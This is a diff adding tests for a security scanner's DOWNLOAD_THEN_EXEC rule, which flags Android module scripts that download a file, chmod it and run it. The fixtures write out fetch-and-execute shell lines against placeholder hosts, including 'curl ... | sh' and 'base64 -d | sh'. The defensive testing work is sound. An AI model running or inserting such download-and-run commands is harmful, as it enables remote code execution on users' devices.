@@ -17,7 +17,7 @@ import {
   MAX_TEXT, MAX_ENTRIES, MAX_RATIO,
   EXEC_BUNDLED_FILE, EXEC_INDIRECT, PROP_BOOT_SPOOF,
 } from './risk-rules.mjs';
-import { scanZip, classify, renderMarkdown, renderJSON, mask, resolveChangeType, hasShebang, CANONICAL_SCRIPTS, FLASH_ENTRY_POINTS, readZip, resolveBundledTargets, resolveBundledRefs, normalizeRefPath, EXEC_UNRESOLVED_ADVICE, EXEC_UNPINNED_ADVICE, SCAN_TARGET_BUCKETS } from './scan.mjs';
+import { scanZip, classify, renderMarkdown, renderJSON, redactText, mask, resolveChangeType, hasShebang, CANONICAL_SCRIPTS, FLASH_ENTRY_POINTS, readZip, resolveBundledTargets, resolveBundledRefs, normalizeRefPath, EXEC_UNRESOLVED_ADVICE, EXEC_UNPINNED_ADVICE, SCAN_TARGET_BUCKETS } from './scan.mjs';
 import { makeModuleZip, moduleProp, scanToReport } from './fixtures.mjs';
 
 // ---------------------------------------------------------------------------
@@ -2565,6 +2565,12 @@ const ANCHOR_WITNESS = {
   EXEC_INDIRECT: { payload: 'sh $PAYLOAD' },
   MODDIR_RUNTIME_WRITE: { payload: 'unzip -q -d $MODDIR /sdcard/p.zip' },
   DOWNLOAD_TO_STDOUT: { payload: 'wget -q -O- https://abc.cc/x' },
+  // Task 3：跨行规则的 witness 载荷必须是**一整篇文本**（hits 把整个 payload 当一篇文本喂给 scan()），
+  // 一条完整的「下载 → 落盘 → 执行」链恰好命中 1 条；前缀形态（ANCHOR_PREFIX 只落在第一行）仍 1 条 ——
+  // 这两件事一起证明：这一支的锚点是「逻辑行里的命令位」，不是「物理行的第一个字符」。
+  DOWNLOAD_THEN_EXEC: {
+    payload: 'curl https://abc.cc/x -o /data/local/tmp/u\nchmod 700 /data/local/tmp/u\n/data/local/tmp/u\n',
+  },
   OBFUSCATED_DECODE_EXEC: { payload: 'echo $B64 | base64 -d | sh' },
   OBFUSCATED_DECODE_ONLY: { payload: 'echo $B64 | base64 -d > /data/local/tmp/out' },
   WRITE_SYSTEM_VENDOR: { payload: 'echo x >> /system/etc/hosts' },
@@ -3396,4 +3402,366 @@ test('Task 2.7 探针：引用方与载荷都在名单外的包，不许走自�
   assert.notEqual(r.decision.action, 'auto-approve', '引用方与载荷都不像脚本的包，不许走自动通道');
   assert.ok(keys.includes('EXEC_BUNDLED_FILE@config.json:1'), '证人必须指名是哪个文件在调用它');
   assert.equal(new Set(keys).size, keys.length, '同一条 finding 不许出现两次（feed 与 covered 混用的后果）');
+});
+
+// ===========================================================================
+// Task 3 —— 两阶段「下载 → 落盘 → 执行」显式分档（DOWNLOAD_THEN_EXEC）
+// ===========================================================================
+// 洞（工单 §1，2026-10-14 主控在 0f4ddbe 实测，本会话不重新推演）：
+//   curl <url> -o /data/local/tmp/u  ->  chmod 700 <同一路径>  ->  裸路径执行
+//   整包 findings 只有 NETWORK_FETCH/low ⇒ low + 首次收录 = **auto-approve**。
+// 管道写法（`curl … | sh`）一直由 PIPE_TO_SHELL 咬住 high/block，落盘写法没人说话 ——
+// 这条规则闭的就是那一格，而不是新增一档：high/block 与既有管道写法同档。
+//
+// 断言口径（工单 §3 的要求，不是建议）：每一条夹具都 deepEqual 到**精确的 findings 多重集合**，
+// 不写 some(...) 那种存在性断言 —— 存在性断言摘掉一条邻居规则照样绿，而这一节要的是
+// 「将来谁把哪一条摘掉/放宽，都在这里当场变红」。反面（不该咬的）同样钉精确集合，
+// 因为「0 命中」必须由整包集合一起说话，否则邻居规则新增的 low 也会被读成「什么都没报」。
+const T3_SHEBANG = '#!/system/bin/sh';
+
+/** T3 夹具统一的取数口径：一个 service.sh（module.prop 由夹具自动补齐），首次收录。 */
+function t3scan(id, body) {
+  return scanToReport(makeModuleZip({ id, files: [['service.sh', body]] }), { changeType: 'first' });
+}
+/** 整份报告的 findings 收成可 deepEqual 的「ruleId/severity」多重集合（排序）。 */
+function t3set(r) {
+  return r.findings.map((f) => `${f.ruleId}/${f.severity}`).sort();
+}
+/** 某一条规则在报告里的落点（文件:行/级别），同样排序后可 deepEqual。 */
+function t3spots(r, ruleId) {
+  return r.findings.filter((f) => f.ruleId === ruleId)
+    .map((f) => `${f.file}:${f.line}/${f.severity}`).sort();
+}
+/** 单条规则在文本层的命中落点（行/级别）。跨行规则的夹具在 scanContent 之下也要钉得住。 */
+function t3hits(text, file = 'service.sh') {
+  return hits('DOWNLOAD_THEN_EXEC', text, file).map((f) => `${f.line}/${f.severity}`).sort();
+}
+const t3body = (...lines) => lines.join('\n') + '\n';
+
+// —— 正面 1–6：必须出 1 条 DOWNLOAD_THEN_EXEC/high，且整包 high/block ——
+
+test('T3.1 正面：curl -o 落盘 → chmod → 裸路径执行（工单 §1 那一格，普通域名，不靠域名抬级）', async () => {
+  const r = await t3scan('eval.t3a', t3body(T3_SHEBANG,
+    'curl https://dl.static-assets.dev/up -o /data/local/tmp/u',
+    'chmod 700 /data/local/tmp/u',
+    '/data/local/tmp/u &'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'], '一条链只报一次，报在执行行上');
+  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low'], 'findings 集合逐条钉死');
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+});
+
+test('T3.2 正面：wget -P <目录> <url> → sh <目录 + URL basename>（计划没写到的 sink 是目录的形状）', async () => {
+  const r = await t3scan('eval.t3b', t3body(T3_SHEBANG,
+    'wget -q -P /data/local/tmp https://dl.static-assets.dev/payload',
+    'sh /data/local/tmp/payload'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:3/high']);
+  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+});
+
+test('T3.3 正面：curl -s <url> > <路径> → sh <路径>（重定向落盘也是 sink）', async () => {
+  const r = await t3scan('eval.t3c', t3body(T3_SHEBANG,
+    'curl -s https://dl.static-assets.dev/y > /data/local/tmp/y',
+    'sh /data/local/tmp/y'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:3/high']);
+  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+});
+
+test('T3.4 正面：NAME=绝对路径 → curl -o "$NAME" → 两侧分别用变量与字面量（替换必须是承重的）', async () => {
+  // 工单 §3.4 的 `"$D"` 形态在最后一行；倒数第二行用**字面量**执行同一个路径。
+  // 两行都留着是有意的：链只报一次，而报的是**最早**那一行 —— 摘掉变量替换时两侧键不再相等，
+  // 只剩 `"$D"` ↔ `"$D"` 这条同名链，落点会从第 4 行漂到第 5 行（变异 (c) 就红在这儿）。
+  const r = await t3scan('eval.t3d', t3body(T3_SHEBANG,
+    'D=/data/local/tmp/p',
+    'curl -s https://dl.static-assets.dev/p -o "$D"',
+    'sh /data/local/tmp/p',
+    '"$D"'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'],
+    '两侧都换成字面值再比：sink 与两个执行形态是同一条链，报最早的执行行');
+  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+});
+
+test('T3.5 正面：curl 的 -o 写在续行上也立得住 sink（命令位由逻辑行说话，见 buildLineContexts）', async () => {
+  const r = await t3scan('eval.t3e', t3body(T3_SHEBANG,
+    'curl \\',
+    '-o /data/local/tmp/u \\',
+    'https://dl.static-assets.dev/up',
+    'chmod 700 /data/local/tmp/u',
+    '/data/local/tmp/u'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:6/high'],
+    '落地行是 -o 那一行（3），执行行 6 > 3 ⇒ 一条链');
+  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+});
+
+test('T3.6 正面：同一 sink 上 chmod + 裸路径 + sh <路径> 三种形态都在 ⇒ 一条链只报一次', async () => {
+  const r = await t3scan('eval.t3f', t3body(T3_SHEBANG,
+    'curl -s https://dl.static-assets.dev/u -o /data/local/tmp/u',
+    'chmod 700 /data/local/tmp/u',
+    '/data/local/tmp/u',
+    'sh /data/local/tmp/u'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'],
+    '三种执行形态是同一条链：取最早的执行行，只出 1 条');
+  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.counts.high, 1, '一条链不许把 high 计数抬成 2');
+});
+
+// —— 负面 7–13：必须**不出** DOWNLOAD_THEN_EXEC，且整包仍可 auto-approve ——
+
+test('T3.7 负面：只下载不执行（存成数据/资源）保持 low / auto-approve —— 这一格不许被 T3 打进去', async () => {
+  const r = await t3scan('eval.t3g', t3body(T3_SHEBANG,
+    'curl -s https://x.dev/db.sqlite -o $MODPATH/db.sqlite'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '下载一个数据库文件不是执行链');
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'low');
+  assert.equal(r.decision.action, 'auto-approve');
+});
+
+test('T3.8 负面：路径只出现在参数位（ls -l / ui_print）不是执行形态', async () => {
+  const r = await t3scan('eval.t3h', t3body(T3_SHEBANG,
+    'curl -s https://x.dev/u -o /data/local/tmp/u',
+    'ls -l /data/local/tmp/u',
+    'ui_print "/data/local/tmp/u"'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '命令位是 ls / ui_print 时路径只是参数');
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'low');
+  assert.equal(r.decision.action, 'auto-approve');
+});
+
+test('T3.9 负面：只有 chmod（下载 + chmod，没有执行）不报 —— 已知限度，不许写成已覆盖', async () => {
+  const r = await t3scan('eval.t3i', t3body(T3_SHEBANG,
+    'curl -s https://x.dev/u -o /data/local/tmp/u',
+    'chmod 700 /data/local/tmp/u'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [],
+    'chmod 644 一个下载来的配置文件是合法形状：单独一条 chmod 不构成执行');
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'low');
+  assert.equal(r.decision.action, 'auto-approve', '这一格今天 low、T3 之后仍是 low（工单 §3.9 要求如实列限度）');
+});
+
+test('T3.10 负面：sink /data/local/tmp/u 与执行 /data/local/tmp/util 不是同一条链（不许前缀模糊匹配）', async () => {
+  const r = await t3scan('eval.t3j', t3body(T3_SHEBANG,
+    'curl -s https://x.dev/u -o /data/local/tmp/u',
+    'sh /data/local/tmp/util'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '前缀相等不等于路径相等');
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'low');
+  assert.equal(r.decision.action, 'auto-approve');
+});
+
+test('T3.11 负面：-o- / -O - 是标准输出，不立 sink（那一行归 DOWNLOAD_TO_STDOUT）', async () => {
+  const r = await t3scan('eval.t3k', t3body(T3_SHEBANG,
+    'curl -o- https://dl.static-assets.dev/u',
+    'wget -q -O - https://dl.static-assets.dev/u',
+    'chmod 700 /data/local/tmp/u',
+    '/data/local/tmp/u'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [],
+    '标准输出没有落盘点：即使执行路径与被下载内容的 basename 相同也不许配对（不许模糊匹配）');
+  assert.deepEqual(t3set(r), ['DOWNLOAD_TO_STDOUT/low', 'DOWNLOAD_TO_STDOUT/low', 'NETWORK_FETCH/low', 'NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'low');
+  assert.equal(r.decision.action, 'auto-approve');
+});
+
+test('T3.12 负面：执行行早于落地行（先 sh 再 curl -o）不许报', async () => {
+  const r = await t3scan('eval.t3l', t3body(T3_SHEBANG,
+    'sh /data/local/tmp/u',
+    'curl -s https://x.dev/u -o /data/local/tmp/u'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '链的方向必须是「先落盘、后执行」');
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
+  assert.equal(r.riskLevel, 'low');
+  assert.equal(r.decision.action, 'auto-approve');
+});
+
+test('T3.13 干净模块哨兵：无下载无执行的模块仍 0 发现 / low / auto-approve（必须带 changeType）', async () => {
+  const r = await t3scan('eval.t3m', t3body(T3_SHEBANG,
+    'ui_print "- installing"',
+    'cp -f busybox $MODPATH/system/xbin/bb',
+    'rm -rf $MODDIR/cache'));
+  assert.deepEqual(t3set(r), [], '哨兵的精确集合是空集：T3 不许给正经模块新增任何发现');
+  assert.equal(r.riskLevel, 'low');
+  assert.equal(r.decision.action, 'auto-approve');
+});
+
+// —— 共存与去重（工单 §2 的验收判据）——
+
+test('T3 共存：落盘进 $MODPATH 再执行时 DOWNLOAD_THEN_EXEC 与 EXEC_BUNDLED_FILE 都要出（两个事实）', async () => {
+  const r = await t3scan('eval.t3n', t3body(T3_SHEBANG,
+    'curl -s https://x.dev/run -o $MODPATH/run.bin',
+    'chmod 755 $MODPATH/run.bin',
+    '$MODPATH/run.bin'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'], '远程内容落盘后执行');
+  assert.deepEqual(t3spots(r, 'EXEC_BUNDLED_FILE'), ['service.sh:4/high'], '包内引用被执行（既有那条不许被摘掉）');
+  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'EXEC_BUNDLED_FILE/high', 'NETWORK_FETCH/low']);
+  assert.equal(r.counts.high, 2, '两条 high 各说一件事：这里不许互相吞，也不许叠成三条');
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+});
+
+test('T3 去重：PIPE_TO_SHELL 与 DOWNLOAD_THEN_EXEC 不叠成两条 high（管道行本身不算执行形态）', async () => {
+  const r = await t3scan('eval.t3o', t3body(T3_SHEBANG, 'curl -s https://x.dev/a | sh'));
+  const both = r.findings.filter((f) => /PIPE_TO_SHELL|DOWNLOAD_THEN_EXEC/.test(f.ruleId));
+  assert.equal(both.length, 1, JSON.stringify(t3set(r)));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '管道写法没有落盘 sink，本规则在该行不出');
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
+  assert.equal(r.riskLevel, 'high');
+});
+
+test('T3 去重（文本层硬约束）：执行行同时是 PIPE_TO_SHELL 的命中行时，本规则在那一行让位', () => {
+  // 工单 §2：管道那一行本身不算执行形态（`curl … | sh` 没有 sink），两条天然不叠。
+  // 这里钉的是那条**硬约束**：一行里既有管道写法、又把已落盘的路径顶在命令位时，只许 PIPE_TO_SHELL 说话。
+  const t = t3body(T3_SHEBANG,
+    'curl -s https://x.dev/u -o /data/local/tmp/u',
+    'curl -s https://x.dev/v | sh; /data/local/tmp/u');
+  assert.deepEqual(hits('PIPE_TO_SHELL', t).map((f) => f.line), [3], '夹具必须真的把管道命中造在执行行上');
+  assert.deepEqual(t3hits(t), [], '该行是 PIPE_TO_SHELL 的命中行 ⇒ 本规则不出');
+  // 同一形状去掉管道写法后必须由本规则说话：证明上面那个 0 是「让位」，不是「没看见这条链」
+  assert.deepEqual(t3hits(t3body(T3_SHEBANG,
+    'curl -s https://x.dev/u -o /data/local/tmp/u',
+    'true; /data/local/tmp/u')), ['3/high']);
+});
+
+// —— 写法面（工单 §2 的负面清单逐条）——
+
+test('T3 写法面：-o/--output/-O/-P/--directory-prefix/>/>> 立 sink；-o- / -O - / --output - / 2> / 无 basename 的 -P 都不立', () => {
+  const chain = (dl, ex) => t3body(T3_SHEBANG, dl, ex);
+  // 立 sink 的写法：落地行 2、执行行 3 ⇒ 1 条
+  for (const dl of [
+    'curl -s https://x.dev/u -o /data/local/tmp/u',
+    'curl -s --output /data/local/tmp/u https://x.dev/u',
+    'curl -s https://x.dev/u --output=/data/local/tmp/u',
+    'wget -q -O /data/local/tmp/u https://x.dev/u',
+    'wget -q -O=/data/local/tmp/u https://x.dev/u',
+    'curl -s https://x.dev/u > /data/local/tmp/u',
+    'curl -s https://x.dev/u >> /data/local/tmp/u',
+  ]) {
+    assert.deepEqual(t3hits(chain(dl, 'sh /data/local/tmp/u')), ['3/high'], `应当立 sink：${dl}`);
+  }
+  for (const [dl, ex] of [
+    ['wget -q -P /data/local/tmp https://x.dev/u', 'sh /data/local/tmp/u'],
+    ['wget -q --directory-prefix /data/local/tmp https://x.dev/u', 'sh /data/local/tmp/u'],
+    ['wget -q -P /data/local/tmp/ https://x.dev/u', 'sh /data/local/tmp/u'],
+    ['wget -q -P "/data/local/tmp" "https://x.dev/a/b"', 'sh /data/local/tmp/b'],
+  ]) {
+    assert.deepEqual(t3hits(chain(dl, ex)), ['3/high'], `-P 的落地路径 = 目录去尾斜杠 + URL basename：${dl}`);
+  }
+  // 不立 sink 的写法：标准输出、带 fd 的重定向、URL 末段没有 basename
+  for (const dl of [
+    'curl -o- https://x.dev/u',
+    'curl -s -o - https://x.dev/u',
+    'curl -s --output - https://x.dev/u',
+    'wget -q -O- https://x.dev/u',
+    'wget -q -O - https://x.dev/u',
+    'curl -s https://x.dev/u 2>/data/local/tmp/u',
+  ]) {
+    assert.deepEqual(t3hits(chain(dl, 'sh /data/local/tmp/u')), [], `标准输出/带 fd 的重定向不是落盘：${dl}`);
+  }
+  for (const dl of [
+    'wget -q -P /data/local/tmp https://x.dev/',
+    'wget -q -P /data/local/tmp https://x.dev',
+  ]) {
+    assert.deepEqual(t3hits(chain(dl, 'sh /data/local/tmp/payload')), [], `URL 末段没有 basename 时不许猜 sink：${dl}`);
+  }
+});
+
+test('T3 执行形态：firstToken 是路径本身、或 sh/bash/ash/source/. 的参数；裸 chmod 与 exec/解释器表外的动词都不算执行', () => {
+  const dl = 'curl -s https://x.dev/u -o /data/local/tmp/u';
+  for (const ex of [
+    '/data/local/tmp/u',
+    'sh /data/local/tmp/u',
+    'bash -x /data/local/tmp/u',
+    'ash /data/local/tmp/u',
+    '. /data/local/tmp/u',
+    'source /data/local/tmp/u',
+    'x=1; /data/local/tmp/u',
+    'true && /data/local/tmp/u',
+  ]) {
+    assert.deepEqual(t3hits(t3body(T3_SHEBANG, dl, ex)), ['3/high'], `执行形态应当说话：${ex}`);
+  }
+  for (const ex of [
+    'chmod 700 /data/local/tmp/u',
+    'chown 0:0 /data/local/tmp/u',
+    'exec /data/local/tmp/u',
+    'nohup /data/local/tmp/u &',
+    'busybox sh /data/local/tmp/u',
+    'ls -l /data/local/tmp/u',
+    'ui_print "/data/local/tmp/u"',
+    'echo /data/local/tmp/u',
+  ]) {
+    assert.deepEqual(t3hits(t3body(T3_SHEBANG, dl, ex)), [], `不是本规则承诺的执行形态：${ex}`);
+  }
+});
+
+test('T3 纯文本判据：注释行里的链不报；跨文件不报（写进已知限度，不许声称覆盖）', () => {
+  // 注释里写完一整条链再执行别的东西：注释行不许立 sink，也不许立执行形态
+  assert.deepEqual(t3hits(t3body(T3_SHEBANG,
+    '# curl -s https://x.dev/u -o /data/local/tmp/u',
+    '# /data/local/tmp/u',
+    'ui_print ok')), []);
+  // 同一篇文本里 sink 与执行分开写在两个文件里 —— 规则只吃单文件文本，跨文件不在能力内
+  const one = hits('DOWNLOAD_THEN_EXEC', t3body(T3_SHEBANG, 'curl -s https://x.dev/u -o /data/local/tmp/u'), 'install.sh');
+  const other = hits('DOWNLOAD_THEN_EXEC', t3body(T3_SHEBANG, 'sh /data/local/tmp/u'), 'service.sh');
+  assert.deepEqual(one.map((f) => f.line), [], 'install.sh 只下载：没有执行行');
+  assert.deepEqual(other.map((f) => f.line), [], 'service.sh 只执行：本规则看不到 install.sh 的 sink');
+});
+
+test('T3 上限：maxPerFile 与工厂一致（每文件每规则 ≤20 条，按链计），且不按执行形态数放大', () => {
+  const lines = [T3_SHEBANG];
+  for (let i = 1; i <= 25; i++) {
+    lines.push(`curl -s https://x.dev/f${i} -o /data/local/tmp/f${i}`);
+    lines.push(`/data/local/tmp/f${i}`);
+  }
+  const found = hits('DOWNLOAD_THEN_EXEC', lines.join('\n') + '\n');
+  assert.equal(found.length, 20, `按链收敛的上限必须是 20，实际 ${found.length}`);
+  assert.deepEqual([...new Set(found.map((f) => f.line))].length, 20, '每条是不同的链，不是同一条重复');
+});
+
+test('T3 规则自身形状：手写但对外与工厂同形；pattern 是 null（redactText 的 !r.pattern 分支），category 复用 execution', () => {
+  const rule = RULES_BY_ID.DOWNLOAD_THEN_EXEC;
+  assert.ok(rule, 'DOWNLOAD_THEN_EXEC 必须进 RULES_BY_ID');
+  assert.ok(CONTENT_RULES.includes(rule), '不进 CONTENT_RULES 的话 scanContent 根本不会跑它');
+  assert.equal(rule.severity, 'high');
+  assert.equal(rule.category, 'execution', '不许新造 category（T2 的 policy 桶教训：新桶忘了渲染等于没说过话）');
+  assert.equal(rule.anchor, 'anywhere', '跨行规则也要声明锚点，闭包表逐条验');
+  assert.equal(rule.pattern, null, '匹配不住在单个正则上：null 是有意为之，redactText 走 if (!r.pattern) continue');
+  assert.ok(rule.title && rule.advice, '报告的两个字段都得有');
+  assert.equal(CATEGORY_LABEL.execution, '载荷间接执行');
+  // snippet 用模块里已有的 trimSnippet：空白压平、超长截尾
+  const h = rule.scan('service.sh', t3body(T3_SHEBANG,
+    'curl -s   https://x.dev/u -o /data/local/tmp/u',
+    'chmod   700 /data/local/tmp/u',
+    '/data/local/tmp/u'));
+  assert.equal(h.length, 1, JSON.stringify(h));
+  assert.equal(h[0].snippet, h[0].snippet.trim());
+  assert.ok(!/\s\s/.test(h[0].snippet), `snippet 必须由 trimSnippet 压平：${JSON.stringify(h[0].snippet)}`);
+  assert.match(h[0].snippet, /\/data\/local\/tmp\/u/);
+  // Finding 形状与工厂逐字段对齐（消息取 title、行号取执行行）
+  assert.deepEqual(Object.keys(h[0]).sort(),
+    ['advice', 'category', 'file', 'line', 'message', 'ruleId', 'severity', 'snippet'].sort());
+  assert.equal(h[0].message, rule.title);
+  assert.equal(h[0].line, 4);
+  // 纯函数：同输入两次逐字节一致（规则表完整性断言用的是 rm 夹具，这里补跨行链的形态）
+  assert.equal(JSON.stringify(rule.scan('x.sh', h[0].snippet)), JSON.stringify(rule.scan('x.sh', h[0].snippet)));
+  // 脱敏通道不许因为 pattern:null 崩掉（本规则不是 privacy 类，压根不进 REDACT_RULES）
+  assert.equal(typeof redactText(t3body(T3_SHEBANG, 'curl -s https://x.dev/u -o /data/local/tmp/u')), 'string');
+});
+
+test('T3 变异防线：链的证据必须同时含落地行与执行行（snippet 里两行都在，缺一行就是报告在说谎）', () => {
+  const t = t3body(T3_SHEBANG,
+    'curl -s https://x.dev/u -o /data/local/tmp/u',
+    'chmod 700 /data/local/tmp/u',
+    '/data/local/tmp/u');
+  const [f] = hits('DOWNLOAD_THEN_EXEC', t, 'service.sh');
+  assert.ok(f, '夹具必须命中，否则下面的断言是空转');
+  assert.match(f.snippet, /curl -s https:\/\/x\.dev\/u -o \/data\/local\/tmp\/u/, '落地行的证据要在');
+  assert.match(f.snippet, /chmod 700 \/data\/local\/tmp\/u/, 'chmod 作为同一条链的证据进 snippet');
+  assert.match(f.snippet, /-> \/data\/local\/tmp\/u/, '执行行的证据要在');
+  assert.equal(f.file, 'service.sh');
 });
